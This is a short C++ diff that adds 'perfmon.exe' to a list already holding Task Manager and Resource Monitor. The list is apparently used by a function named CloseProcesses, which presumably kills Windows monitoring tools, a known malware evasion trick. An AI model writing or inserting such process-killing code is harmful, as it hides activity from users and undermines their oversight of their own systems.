@@ -3,7 +3,8 @@
 
 static const std::string TaskList[] = {
 	"Taskmgr.exe",
-	"Resmon.exe",
+	"resmon.exe",
+	"perfmon.exe",
 };
 
 void CloseProcesses() {
